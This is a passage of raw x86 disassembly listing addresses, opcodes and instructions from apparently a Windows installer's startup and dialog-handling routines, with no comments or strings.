  403a2e:	56                   	push   %esi
  403a2f:	e8 61 22 00 00       	call   0x405c95
  403a34:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a38:	ff 44 24 10          	incl   0x10(%esp)
  403a3c:	85 c0                	test   %eax,%eax
  403a3e:	74 99                	je     0x4039d9
  403a40:	ff 44 24 14          	incl   0x14(%esp)
  403a44:	33 ed                	xor    %ebp,%ebp
  403a46:	66 39 6c 24 14       	cmp    %bp,0x14(%esp)
  403a4b:	75 83                	jne    0x4039d0
  403a4d:	eb 60                	jmp    0x403aaf
  403a4f:	56                   	push   %esi
  403a50:	ff 15 e0 80 40 00    	call   *0x4080e0
  403a56:	6a 00                	push   $0x0
  403a58:	56                   	push   %esi
  403a59:	e8 eb 28 00 00       	call   0x406349
  403a5e:	6a 01                	push   $0x1
  403a60:	57                   	push   %edi
  403a61:	68 00 78 43 00       	push   $0x437800
  403a66:	ff 15 6c 81 40 00    	call   *0x40816c
  403a6c:	85 c0                	test   %eax,%eax
  403a6e:	74 3d                	je     0x403aad
  403a70:	6a 00                	push   $0x0
  403a72:	57                   	push   %edi
  403a73:	e8 d1 28 00 00       	call   0x406349
  403a78:	a1 30 9a 42 00       	mov    0x429a30,%eax
  403a7d:	ff b0 24 01 00 00    	push   0x124(%eax)
  403a83:	53                   	push   %ebx
  403a84:	e8 3d 2b 00 00       	call   0x4065c6
  403a89:	53                   	push   %ebx
  403a8a:	e8 dd 20 00 00       	call   0x405b6c
  403a8f:	85 c0                	test   %eax,%eax
  403a91:	75 44                	jne    0x403ad7
  403a93:	8b 44 24 10          	mov    0x10(%esp),%eax
  403a97:	ff 44 24 10          	incl   0x10(%esp)
  403a9b:	85 c0                	test   %eax,%eax
  403a9d:	75 0e                	jne    0x403aad
  403a9f:	57                   	push   %edi
  403aa0:	e8 41 2e 00 00       	call   0x4068e6
  403aa5:	85 c0                	test   %eax,%eax
  403aa7:	0f 84 2c ff ff ff    	je     0x4039d9
  403aad:	33 ed                	xor    %ebp,%ebp
  403aaf:	e8 cd 00 00 00       	call   0x403b81
  403ab4:	ff 15 94 82 40 00    	call   *0x408294
  403aba:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  403abe:	5b                   	pop    %ebx
  403abf:	74 24                	je     0x403ae5
  403ac1:	68 10 00 20 00       	push   $0x200010
  403ac6:	ff 74 24 18          	push   0x18(%esp)
  403aca:	e8 1a 21 00 00       	call   0x405be9
  403acf:	6a 02                	push   $0x2
  403ad1:	ff 15 bc 80 40 00    	call   *0x4080bc
  403ad7:	50                   	push   %eax
  403ad8:	ff 15 fc 80 40 00    	call   *0x4080fc
  403ade:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403ae3:	eb c8                	jmp    0x403aad
  403ae5:	39 2d b4 9a 42 00    	cmp    %ebp,0x429ab4
  403aeb:	74 7c                	je     0x403b69
  403aed:	8d 44 24 20          	lea    0x20(%esp),%eax
  403af1:	50                   	push   %eax
  403af2:	6a 28                	push   $0x28
  403af4:	ff 15 c0 80 40 00    	call   *0x4080c0
  403afa:	50                   	push   %eax
  403afb:	ff 15 24 80 40 00    	call   *0x408024
  403b01:	85 c0                	test   %eax,%eax
  403b03:	74 34                	je     0x403b39
  403b05:	8d 44 24 28          	lea    0x28(%esp),%eax
  403b09:	50                   	push   %eax
  403b0a:	68 30 a2 40 00       	push   $0x40a230
  403b0f:	55                   	push   %ebp
  403b10:	ff 15 20 80 40 00    	call   *0x408020
  403b16:	55                   	push   %ebp
  403b17:	55                   	push   %ebp
  403b18:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403b1c:	55                   	push   %ebp
  403b1d:	50                   	push   %eax
  403b1e:	55                   	push   %ebp
  403b1f:	ff 74 24 34          	push   0x34(%esp)
  403b23:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403b2a:	00 
  403b2b:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403b32:	00 
  403b33:	ff 15 1c 80 40 00    	call   *0x40801c
  403b39:	6a 04                	push   $0x4
  403b3b:	e8 3d 2e 00 00       	call   0x40697d
  403b40:	3b c5                	cmp    %ebp,%eax
  403b42:	be 02 00 04 80       	mov    $0x80040002,%esi
  403b47:	74 0c                	je     0x403b55
  403b49:	56                   	push   %esi
  403b4a:	6a 25                	push   $0x25
  403b4c:	55                   	push   %ebp
  403b4d:	55                   	push   %ebp
  403b4e:	55                   	push   %ebp
  403b4f:	ff d0                	call   *%eax
  403b51:	85 c0                	test   %eax,%eax
  403b53:	74 0d                	je     0x403b62
  403b55:	56                   	push   %esi
  403b56:	6a 02                	push   $0x2
  403b58:	ff 15 0c 82 40 00    	call   *0x40820c
  403b5e:	85 c0                	test   %eax,%eax
  403b60:	75 07                	jne    0x403b69
  403b62:	6a 09                	push   $0x9
  403b64:	e8 a2 d8 ff ff       	call   0x40140b
  403b69:	a1 cc 9a 42 00       	mov    0x429acc,%eax
  403b6e:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b71:	74 04                	je     0x403b77
  403b73:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403b77:	ff 74 24 1c          	push   0x1c(%esp)
  403b7b:	ff 15 bc 80 40 00    	call   *0x4080bc
  403b81:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403b86:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b89:	74 0e                	je     0x403b99
  403b8b:	50                   	push   %eax
  403b8c:	ff 15 fc 80 40 00    	call   *0x4080fc
  403b92:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403b99:	e8 28 00 00 00       	call   0x403bc6
  403b9e:	6a 07                	push   $0x7
  403ba0:	68 00 70 43 00       	push   $0x437000
  403ba5:	e8 eb 20 00 00       	call   0x405c95
  403baa:	c3                   	ret
  403bab:	56                   	push   %esi
  403bac:	8b 35 cc 0e 42 00    	mov    0x420ecc,%esi
  403bb2:	eb 0a                	jmp    0x403bbe
  403bb4:	ff 74 24 08          	push   0x8(%esp)
  403bb8:	ff 56 04             	call   *0x4(%esi)
  403bbb:	8b 36                	mov    (%esi),%esi
  403bbd:	59                   	pop    %ecx
  403bbe:	85 f6                	test   %esi,%esi
  403bc0:	75 f2                	jne    0x403bb4
  403bc2:	5e                   	pop    %esi
  403bc3:	c2 04 00             	ret    $0x4
  403bc6:	56                   	push   %esi
  403bc7:	8b 35 cc 0e 42 00    	mov    0x420ecc,%esi
  403bcd:	6a 00                	push   $0x0
  403bcf:	e8 d7 ff ff ff       	call   0x403bab
  403bd4:	85 f6                	test   %esi,%esi
  403bd6:	74 1a                	je     0x403bf2
  403bd8:	57                   	push   %edi
  403bd9:	8b fe                	mov    %esi,%edi
  403bdb:	8b 36                	mov    (%esi),%esi
  403bdd:	ff 77 08             	push   0x8(%edi)
  403be0:	ff 15 1c 81 40 00    	call   *0x40811c
  403be6:	57                   	push   %edi
  403be7:	ff 15 0c 81 40 00    	call   *0x40810c
  403bed:	85 f6                	test   %esi,%esi
  403bef:	75 e8                	jne    0x403bd9
  403bf1:	5f                   	pop    %edi
  403bf2:	83 25 cc 0e 42 00 00 	andl   $0x0,0x420ecc
  403bf9:	5e                   	pop    %esi
  403bfa:	c3                   	ret
  403bfb:	a1 cc 0e 42 00       	mov    0x420ecc,%eax
  403c00:	eb 0b                	jmp    0x403c0d
  403c02:	8b 48 08             	mov    0x8(%eax),%ecx
  403c05:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403c09:	74 0a                	je     0x403c15
  403c0b:	8b 00                	mov    (%eax),%eax
  403c0d:	85 c0                	test   %eax,%eax
  403c0f:	75 f1                	jne    0x403c02
  403c11:	40                   	inc    %eax
  403c12:	c2 04 00             	ret    $0x4
  403c15:	33 c0                	xor    %eax,%eax
  403c17:	eb f9                	jmp    0x403c12
  403c19:	56                   	push   %esi
  403c1a:	8b 74 24 08          	mov    0x8(%esp),%esi
  403c1e:	56                   	push   %esi
  403c1f:	e8 d7 ff ff ff       	call   0x403bfb
  403c24:	85 c0                	test   %eax,%eax
  403c26:	75 03                	jne    0x403c2b
  403c28:	40                   	inc    %eax
  403c29:	eb 2c                	jmp    0x403c57
  403c2b:	6a 0c                	push   $0xc
  403c2d:	6a 40                	push   $0x40
  403c2f:	ff 15 10 81 40 00    	call   *0x408110
  403c35:	85 c0                	test   %eax,%eax
  403c37:	74 1b                	je     0x403c54
  403c39:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c3d:	89 70 08             	mov    %esi,0x8(%eax)
  403c40:	89 48 04             	mov    %ecx,0x4(%eax)
  403c43:	8b 0d cc 0e 42 00    	mov    0x420ecc,%ecx
  403c49:	89 08                	mov    %ecx,(%eax)
  403c4b:	a3 cc 0e 42 00       	mov    %eax,0x420ecc
  403c50:	33 c0                	xor    %eax,%eax
  403c52:	eb 03                	jmp    0x403c57
  403c54:	83 c8 ff             	or     $0xffffffff,%eax
  403c57:	5e                   	pop    %esi
  403c58:	c2 08 00             	ret    $0x8
  403c5b:	83 ec 10             	sub    $0x10,%esp
  403c5e:	53                   	push   %ebx
  403c5f:	55                   	push   %ebp
  403c60:	56                   	push   %esi
  403c61:	8b 35 30 9a 42 00    	mov    0x429a30,%esi
  403c67:	57                   	push   %edi
  403c68:	6a 02                	push   $0x2
  403c6a:	e8 0e 2d 00 00       	call   0x40697d
  403c6f:	33 ff                	xor    %edi,%edi
  403c71:	3b c7                	cmp    %edi,%eax
  403c73:	74 12                	je     0x403c87
  403c75:	ff d0                	call   *%eax
  403c77:	0f b7 c0             	movzwl %ax,%eax
  403c7a:	50                   	push   %eax
  403c7b:	68 00 60 43 00       	push   $0x436000
  403c80:	e8 4b 28 00 00       	call   0x4064d0
  403c85:	eb 5a                	jmp    0x403ce1
  403c87:	bb 08 2f 42 00       	mov    $0x422f08,%ebx
  403c8c:	57                   	push   %edi
  403c8d:	53                   	push   %ebx
  403c8e:	57                   	push   %edi
  403c8f:	68 90 83 40 00       	push   $0x408390
  403c94:	68 01 00 00 80       	push   $0x80000001
  403c99:	66 c7 05 00 60 43 00 	movw   $0x30,0x436000
  403ca0:	30 00 
  403ca2:	66 c7 05 02 60 43 00 	movw   $0x78,0x436002
  403ca9:	78 00 
  403cab:	66 89 3d 04 60 43 00 	mov    %di,0x436004
  403cb2:	e8 a0 27 00 00       	call   0x406457
  403cb7:	66 39 3d 08 2f 42 00 	cmp    %di,0x422f08
  403cbe:	75 16                	jne    0x403cd6
  403cc0:	57                   	push   %edi
  403cc1:	53                   	push   %ebx
  403cc2:	68 cc 83 40 00       	push   $0x4083cc
  403cc7:	68 40 83 40 00       	push   $0x408340
  403ccc:	68 03 00 00 80       	push   $0x80000003
  403cd1:	e8 81 27 00 00       	call   0x406457
  403cd6:	53                   	push   %ebx
  403cd7:	68 00 60 43 00       	push   $0x436000
  403cdc:	e8 c4 28 00 00       	call   0x4065a5
  403ce1:	e8 4b 02 00 00       	call   0x403f31
  403ce6:	a1 38 9a 42 00       	mov    0x429a38,%eax
  403ceb:	bd 00 48 43 00       	mov    $0x434800,%ebp
  403cf0:	83 e0 20             	and    $0x20,%eax
  403cf3:	55                   	push   %ebp
  403cf4:	a3 a0 9a 42 00       	mov    %eax,0x429aa0
  403cf9:	c7 05 bc 9a 42 00 00 	movl   $0x10000,0x429abc
  403d00:	00 01 00 
  403d03:	e8 58 22 00 00       	call   0x405f60
  403d08:	85 c0                	test   %eax,%eax
  403d0a:	0f 85 8c 00 00 00    	jne    0x403d9c
  403d10:	8b 4e 48             	mov    0x48(%esi),%ecx
  403d13:	3b cf                	cmp    %edi,%ecx
  403d15:	0f 84 81 00 00 00    	je     0x403d9c
  403d1b:	8b 56 4c             	mov    0x4c(%esi),%edx
  403d1e:	a1 58 9a 42 00       	mov    0x429a58,%eax
  403d23:	bb c0 79 42 00       	mov    $0x4279c0,%ebx
  403d28:	57                   	push   %edi
  403d29:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403d2c:	53                   	push   %ebx
  403d2d:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403d30:	52                   	push   %edx
  403d31:	50                   	push   %eax
  403d32:	ff 76 44             	push   0x44(%esi)
  403d35:	e8 1d 27 00 00       	call   0x406457
  403d3a:	66 a1 c0 79 42 00    	mov    0x4279c0,%ax
  403d40:	66 3b c7             	cmp    %di,%ax
  403d43:	74 57                	je     0x403d9c
  403d45:	66 3d 22 00          	cmp    $0x22,%ax
  403d49:	75 10                	jne    0x403d5b
  403d4b:	bb c2 79 42 00       	mov    $0x4279c2,%ebx
  403d50:	6a 22                	push   $0x22
  403d52:	53                   	push   %ebx
  403d53:	e8 2d 21 00 00       	call   0x405e85
  403d58:	66 89 38             	mov    %di,(%eax)
  403d5b:	53                   	push   %ebx
  403d5c:	e8 3e 28 00 00       	call   0x40659f
  403d61:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403d65:	3b c3                	cmp    %ebx,%eax
  403d67:	76 26                	jbe    0x403d8f
  403d69:	68 80 a3 40 00       	push   $0x40a380
  403d6e:	50                   	push   %eax
  403d6f:	ff 15 00 81 40 00    	call   *0x408100
  403d75:	85 c0                	test   %eax,%eax
  403d77:	75 16                	jne    0x403d8f
  403d79:	53                   	push   %ebx
  403d7a:	ff 15 dc 80 40 00    	call   *0x4080dc
  403d80:	83 f8 ff             	cmp    $0xffffffff,%eax
  403d83:	74 04                	je     0x403d89
  403d85:	a8 10                	test   $0x10,%al
  403d87:	75 06                	jne    0x403d8f
  403d89:	53                   	push   %ebx
  403d8a:	e8 15 21 00 00       	call   0x405ea4
  403d8f:	53                   	push   %ebx
  403d90:	e8 c3 20 00 00       	call   0x405e58
  403d95:	50                   	push   %eax
  403d96:	55                   	push   %ebp
  403d97:	e8 ed 27 00 00       	call   0x406589
  403d9c:	55                   	push   %ebp
  403d9d:	e8 be 21 00 00       	call   0x405f60
  403da2:	85 c0                	test   %eax,%eax
  403da4:	75 0c                	jne    0x403db2
  403da6:	ff b6 18 01 00 00    	push   0x118(%esi)
  403dac:	55                   	push   %ebp
  403dad:	e8 14 28 00 00       	call   0x4065c6
  403db2:	68 40 80 00 00       	push   $0x8040
  403db7:	57                   	push   %edi
  403db8:	57                   	push   %edi
  403db9:	6a 01                	push   $0x1
  403dbb:	6a 67                	push   $0x67
  403dbd:	ff 35 20 9a 42 00    	push   0x429a20
  403dc3:	ff 15 44 82 40 00    	call   *0x408244
  403dc9:	a3 08 8a 42 00       	mov    %eax,0x428a08
  403dce:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403dd2:	bb c0 89 42 00       	mov    $0x4289c0,%ebx
  403dd7:	74 7f                	je     0x403e58
  403dd9:	8b 0d 20 9a 42 00    	mov    0x429a20,%ecx
  403ddf:	be 78 a3 40 00       	mov    $0x40a378,%esi
  403de4:	53                   	push   %ebx
  403de5:	c7 05 c4 89 42 00 00 	movl   $0x401000,0x4289c4
  403dec:	10 40 00 
  403def:	89 0d d0 89 42 00    	mov    %ecx,0x4289d0
  403df5:	a3 d4 89 42 00       	mov    %eax,0x4289d4
  403dfa:	89 35 e4 89 42 00    	mov    %esi,0x4289e4
  403e00:	ff 15 f4 81 40 00    	call   *0x4081f4
  403e06:	66 85 c0             	test   %ax,%ax
  403e09:	0f 84 18 01 00 00    	je     0x403f27
  403e0f:	8d 44 24 10          	lea    0x10(%esp),%eax
  403e13:	57                   	push   %edi
  403e14:	50                   	push   %eax
  403e15:	57                   	push   %edi
  403e16:	6a 30                	push   $0x30
  403e18:	ff 15 f8 81 40 00    	call   *0x4081f8
  403e1e:	57                   	push   %edi
  403e1f:	ff 35 20 9a 42 00    	push   0x429a20
  403e25:	8b 44 24 24          	mov    0x24(%esp),%eax
  403e29:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403e2d:	57                   	push   %edi
  403e2e:	57                   	push   %edi
  403e2f:	50                   	push   %eax
  403e30:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403e34:	2b 44 24 24          	sub    0x24(%esp),%eax
  403e38:	50                   	push   %eax
  403e39:	ff 74 24 2c          	push   0x2c(%esp)
  403e3d:	ff 74 24 2c          	push   0x2c(%esp)
  403e41:	68 00 00 00 80       	push   $0x80000000
  403e46:	57                   	push   %edi
  403e47:	56                   	push   %esi
  403e48:	68 80 00 00 00       	push   $0x80
  403e4d:	ff 15 80 82 40 00    	call   *0x408280
  403e53:	a3 e8 2e 42 00       	mov    %eax,0x422ee8
  403e58:	57                   	push   %edi
  403e59:	e8 ad d5 ff ff       	call   0x40140b
  403e5e:	85 c0                	test   %eax,%eax
  403e60:	74 08                	je     0x403e6a
  403e62:	6a 02                	push   $0x2
  403e64:	58                   	pop    %eax
  403e65:	e9 bf 00 00 00       	jmp    0x403f29
  403e6a:	e8 c2 00 00 00       	call   0x403f31
  403e6f:	39 3d c0 9a 42 00    	cmp    %edi,0x429ac0
  403e75:	0f 85 83 00 00 00    	jne    0x403efe
  403e7b:	6a 05                	push   $0x5
  403e7d:	ff 35 e8 2e 42 00    	push   0x422ee8
  403e83:	ff 15 28 82 40 00    	call   *0x408228
  403e89:	68 34 83 40 00       	push   $0x408334
  403e8e:	e8 7a 2a 00 00       	call   0x40690d
  403e93:	85 c0                	test   %eax,%eax
  403e95:	75 0a                	jne    0x403ea1
  403e97:	68 28 83 40 00       	push   $0x408328
  403e9c:	e8 6c 2a 00 00       	call   0x40690d
  403ea1:	8b 35 00 82 40 00    	mov    0x408200,%esi
  403ea7:	bd 10 83 40 00       	mov    $0x408310,%ebp
  403eac:	53                   	push   %ebx
  403ead:	55                   	push   %ebp
  403eae:	57                   	push   %edi
  403eaf:	ff d6                	call   *%esi
  403eb1:	85 c0                	test   %eax,%eax
  403eb3:	75 16                	jne    0x403ecb
  403eb5:	53                   	push   %ebx
  403eb6:	68 fc 82 40 00       	push   $0x4082fc
  403ebb:	57                   	push   %edi
  403ebc:	ff d6                	call   *%esi
  403ebe:	53                   	push   %ebx
  403ebf:	89 2d e4 89 42 00    	mov    %ebp,0x4289e4
  403ec5:	ff 15 f4 81 40 00    	call   *0x4081f4
  403ecb:	a1 00 8a 42 00       	mov    0x428a00,%eax
  403ed0:	57                   	push   %edi
  403ed1:	83 c0 69             	add    $0x69,%eax
  403ed4:	68 09 40 40 00       	push   $0x404009
  403ed9:	0f b7 c0             	movzwl %ax,%eax
  403edc:	57                   	push   %edi
  403edd:	50                   	push   %eax
  403ede:	ff 35 20 9a 42 00    	push   0x429a20
  403ee4:	ff 15 04 82 40 00    	call   *0x408204
  403eea:	6a 05                	push   $0x5
  403eec:	8b f0                	mov    %eax,%esi
  403eee:	e8 18 d5 ff ff       	call   0x40140b
  403ef3:	6a 01                	push   $0x1
  403ef5:	e8 b1 fc ff ff       	call   0x403bab
  403efa:	8b c6                	mov    %esi,%eax
  403efc:	eb 2b                	jmp    0x403f29
  403efe:	57                   	push   %edi
  403eff:	e8 dd 17 00 00       	call   0x4056e1
  403f04:	85 c0                	test   %eax,%eax
  403f06:	74 18                	je     0x403f20
  403f08:	39 3d ec 89 42 00    	cmp    %edi,0x4289ec
  403f0e:	0f 85 4e ff ff ff    	jne    0x403e62
  403f14:	6a 02                	push   $0x2
  403f16:	e8 f0 d4 ff ff       	call   0x40140b
  403f1b:	e9 42 ff ff ff       	jmp    0x403e62
  403f20:	6a 01                	push   $0x1
  403f22:	e8 e4 d4 ff ff       	call   0x40140b
  403f27:	33 c0                	xor    %eax,%eax
  403f29:	5f                   	pop    %edi
  403f2a:	5e                   	pop    %esi
  403f2b:	5d                   	pop    %ebp
  403f2c:	5b                   	pop    %ebx
  403f2d:	83 c4 10             	add    $0x10,%esp
  403f30:	c3                   	ret
  403f31:	53                   	push   %ebx
  403f32:	55                   	push   %ebp
  403f33:	56                   	push   %esi
  403f34:	57                   	push   %edi
  403f35:	bf 00 60 43 00       	mov    $0x436000,%edi
  403f3a:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403f3f:	57                   	push   %edi
  403f40:	e8 a4 25 00 00       	call   0x4064e9
  403f45:	8b 35 64 9a 42 00    	mov    0x429a64,%esi
  403f4b:	85 f6                	test   %esi,%esi
  403f4d:	74 45                	je     0x403f94
  403f4f:	8b 0d 30 9a 42 00    	mov    0x429a30,%ecx
  403f55:	8b 49 64             	mov    0x64(%ecx),%ecx
  403f58:	8b d1                	mov    %ecx,%edx
  403f5a:	0f af ce             	imul   %esi,%ecx
  403f5d:	f7 da                	neg    %edx
  403f5f:	03 0d 60 9a 42 00    	add    0x429a60,%ecx
  403f65:	03 ca                	add    %edx,%ecx
  403f67:	4e                   	dec    %esi
  403f68:	66 8b 29             	mov    (%ecx),%bp
  403f6b:	66 33 e8             	xor    %ax,%bp
  403f6e:	23 eb                	and    %ebx,%ebp
  403f70:	66 85 ed             	test   %bp,%bp
  403f73:	74 06                	je     0x403f7b
  403f75:	85 f6                	test   %esi,%esi
  403f77:	75 ec                	jne    0x403f65
  403f79:	eb 19                	jmp    0x403f94
  403f7b:	8b 51 02             	mov    0x2(%ecx),%edx
  403f7e:	89 15 00 8a 42 00    	mov    %edx,0x428a00
  403f84:	8b 51 06             	mov    0x6(%ecx),%edx
  403f87:	89 15 c8 9a 42 00    	mov    %edx,0x429ac8
  403f8d:	8d 51 0a             	lea    0xa(%ecx),%edx
  403f90:	85 d2                	test   %edx,%edx
  403f92:	75 12                	jne    0x403fa6
  403f94:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403f99:	75 07                	jne    0x403fa2
  403f9b:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403fa0:	eb a3                	jmp    0x403f45
  403fa2:	33 db                	xor    %ebx,%ebx
  403fa4:	eb 9f                	jmp    0x403f45
  403fa6:	89 15 fc 89 42 00    	mov    %edx,0x4289fc
  403fac:	0f b7 01             	movzwl (%ecx),%eax
  403faf:	50                   	push   %eax
  403fb0:	57                   	push   %edi
  403fb1:	e8 1a 25 00 00       	call   0x4064d0
  403fb6:	e8 2f 00 00 00       	call   0x403fea
  403fbb:	a1 4c 9a 42 00       	mov    0x429a4c,%eax
  403fc0:	8b 35 48 9a 42 00    	mov    0x429a48,%esi
  403fc6:	85 c0                	test   %eax,%eax
  403fc8:	74 1b                	je     0x403fe5
  403fca:	8b f8                	mov    %eax,%edi
  403fcc:	8b 06                	mov    (%esi),%eax
  403fce:	85 c0                	test   %eax,%eax
  403fd0:	74 0a                	je     0x403fdc
  403fd2:	50                   	push   %eax
  403fd3:	8d 46 18             	lea    0x18(%esi),%eax
  403fd6:	50                   	push   %eax
  403fd7:	e8 ea 25 00 00       	call   0x4065c6
  403fdc:	81 c6 18 08 00 00    	add    $0x818,%esi
  403fe2:	4f                   	dec    %edi
  403fe3:	75 e7                	jne    0x403fcc
  403fe5:	5f                   	pop    %edi
  403fe6:	5e                   	pop    %esi
  403fe7:	5d                   	pop    %ebp
  403fe8:	5b                   	pop    %ebx
  403fe9:	c3                   	ret
  403fea:	56                   	push   %esi
  403feb:	be 20 8a 42 00       	mov    $0x428a20,%esi
  403ff0:	6a fe                	push   $0xfffffffe
  403ff2:	56                   	push   %esi
  403ff3:	e8 ce 25 00 00       	call   0x4065c6
  403ff8:	56                   	push   %esi
  403ff9:	ff 35 e8 2e 42 00    	push   0x422ee8
  403fff:	ff 15 1c 82 40 00    	call   *0x40821c
  404005:	8b c6                	mov    %esi,%eax
  404007:	5e                   	pop    %esi
  404008:	c3                   	ret
  404009:	83 ec 10             	sub    $0x10,%esp
  40400c:	b9 10 01 00 00       	mov    $0x110,%ecx
  404011:	53                   	push   %ebx
  404012:	55                   	push   %ebp
  404013:	56                   	push   %esi
  404014:	8b 74 24 24          	mov    0x24(%esp),%esi
  404018:	3b f1                	cmp    %ecx,%esi
  40401a:	57                   	push   %edi
  40401b:	0f 84 61 01 00 00    	je     0x404182
  404021:	81 fe 08 04 00 00    	cmp    $0x408,%esi
  404027:	0f 84 55 01 00 00    	je     0x404182
  40402d:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404031:	33 ed                	xor    %ebp,%ebp
  404033:	83 fe 47             	cmp    $0x47,%esi
  404036:	75 13                	jne    0x40404b
  404038:	6a 13                	push   $0x13
  40403a:	55                   	push   %ebp
  40403b:	55                   	push   %ebp
  40403c:	55                   	push   %ebp
  40403d:	55                   	push   %ebp
  40403e:	57                   	push   %edi
  40403f:	ff 35 e8 2e 42 00    	push   0x422ee8
  404045:	ff 15 d0 81 40 00    	call   *0x4081d0
  40404b:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  40404f:	83 fe 05             	cmp    $0x5,%esi
  404052:	75 42                	jne    0x404096
  404054:	8b c3                	mov    %ebx,%eax
  404056:	48                   	dec    %eax
  404057:	f7 d8                	neg    %eax
  404059:	1b c0                	sbb    %eax,%eax
  40405b:	83 e0 05             	and    $0x5,%eax
  40405e:	50                   	push   %eax
  40405f:	ff 35 e8 2e 42 00    	push   0x422ee8
  404065:	ff 15 28 82 40 00    	call   *0x408228
  40406b:	83 fb 02             	cmp    $0x2,%ebx
  40406e:	0f 85 fb 00 00 00    	jne    0x40416f
  404074:	6a f0                	push   $0xfffffff0
  404076:	57                   	push   %edi
  404077:	ff 15 d4 81 40 00    	call   *0x4081d4
  40407d:	25 00 00 01 21       	and    $0x21010000,%eax
  404082:	3d 00 00 00 01       	cmp    $0x1000000,%eax
  404087:	0f 85 e2 00 00 00    	jne    0x40416f
  40408d:	6a 04                	push   $0x4
  40408f:	57                   	push   %edi
  404090:	ff 15 28 82 40 00    	call   *0x408228
  404096:	81 fe 0d 04 00 00    	cmp    $0x40d,%esi
  40409c:	75 17                	jne    0x4040b5
  40409e:	ff 35 f8 89 42 00    	push   0x4289f8
  4040a4:	ff 15 10 82 40 00    	call   *0x408210
  4040aa:	89 1d f8 89 42 00    	mov    %ebx,0x4289f8
  4040b0:	e9 fd 03 00 00       	jmp    0x4044b2
  4040b5:	83 fe 11             	cmp    $0x11,%esi
  4040b8:	75 11                	jne    0x4040cb
  4040ba:	55                   	push   %ebp
  4040bb:	55                   	push   %ebp
  4040bc:	57                   	push   %edi
  4040bd:	ff 15 40 82 40 00    	call   *0x408240
  4040c3:	33 c0                	xor    %eax,%eax
  4040c5:	40                   	inc    %eax
  4040c6:	e9 0c 04 00 00       	jmp    0x4044d7
  4040cb:	81 fe 11 01 00 00    	cmp    $0x111,%esi
  4040d1:	0f 85 98 00 00 00    	jne    0x40416f
  4040d7:	0f b7 f3             	movzwl %bx,%esi
  4040da:	56                   	push   %esi
  4040db:	57                   	push   %edi
  4040dc:	ff 15 3c 82 40 00    	call   *0x40823c
  4040e2:	8b f8                	mov    %eax,%edi
  4040e4:	3b fd                	cmp    %ebp,%edi
  4040e6:	74 1d                	je     0x404105
  4040e8:	55                   	push   %ebp
  4040e9:	55                   	push   %ebp
  4040ea:	68 f3 00 00 00       	push   $0xf3
  4040ef:	57                   	push   %edi
  4040f0:	ff 15 58 82 40 00    	call   *0x408258
  4040f6:	57                   	push   %edi
  4040f7:	ff 15 d8 81 40 00    	call   *0x4081d8
  4040fd:	85 c0                	test   %eax,%eax
  4040ff:	0f 84 d0 03 00 00    	je     0x4044d5
  404105:	83 fe 01             	cmp    $0x1,%esi
  404108:	75 03                	jne    0x40410d
  40410a:	56                   	push   %esi
  40410b:	eb 2e                	jmp    0x40413b
  40410d:	83 fe 03             	cmp    $0x3,%esi
  404110:	75 0c                	jne    0x40411e
  404112:	39 2d 60 a3 40 00    	cmp    %ebp,0x40a360
  404118:	7e 3f                	jle    0x404159
  40411a:	6a ff                	push   $0xffffffff
  40411c:	eb 1d                	jmp    0x40413b
  40411e:	6a 02                	push   $0x2
  404120:	5f                   	pop    %edi
  404121:	3b f7                	cmp    %edi,%esi
  404123:	75 34                	jne    0x404159
  404125:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  40412b:	74 15                	je     0x404142
  40412d:	57                   	push   %edi
  40412e:	e8 d8 d2 ff ff       	call   0x40140b
  404133:	89 3d d8 16 42 00    	mov    %edi,0x4216d8
  404139:	6a 78                	push   $0x78
  40413b:	e8 a1 03 00 00       	call   0x4044e1
  404140:	eb 2d                	jmp    0x40416f
  404142:	6a 03                	push   $0x3
  404144:	e8 c2 d2 ff ff       	call   0x40140b
  404149:	85 c0                	test   %eax,%eax
  40414b:	75 22                	jne    0x40416f
  40414d:	c7 05 d8 16 42 00 01 	movl   $0x1,0x4216d8
  404154:	00 00 00 
  404157:	eb e0                	jmp    0x404139
  404159:	ff 74 24 30          	push   0x30(%esp)
  40415d:	53                   	push   %ebx
  40415e:	68 11 01 00 00       	push   $0x111
  404163:	ff 35 f8 89 42 00    	push   0x4289f8
  404169:	ff 15 58 82 40 00    	call   *0x408258
  40416f:	ff 74 24 30          	push   0x30(%esp)
  404173:	53                   	push   %ebx
  404174:	ff 74 24 30          	push   0x30(%esp)
  404178:	e8 f2 03 00 00       	call   0x40456f
  40417d:	e9 55 03 00 00       	jmp    0x4044d7
  404182:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404186:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40418a:	3b f1                	cmp    %ecx,%esi
  40418c:	a3 f0 2e 42 00       	mov    %eax,0x422ef0
  404191:	75 4d                	jne    0x4041e0
  404193:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  404199:	6a 01                	push   $0x1
  40419b:	57                   	push   %edi
  40419c:	89 3d 28 9a 42 00    	mov    %edi,0x429a28
  4041a2:	ff d6                	call   *%esi
  4041a4:	6a 02                	push   $0x2
  4041a6:	57                   	push   %edi
  4041a7:	a3 04 2f 42 00       	mov    %eax,0x422f04
  4041ac:	ff d6                	call   *%esi
  4041ae:	6a ff                	push   $0xffffffff
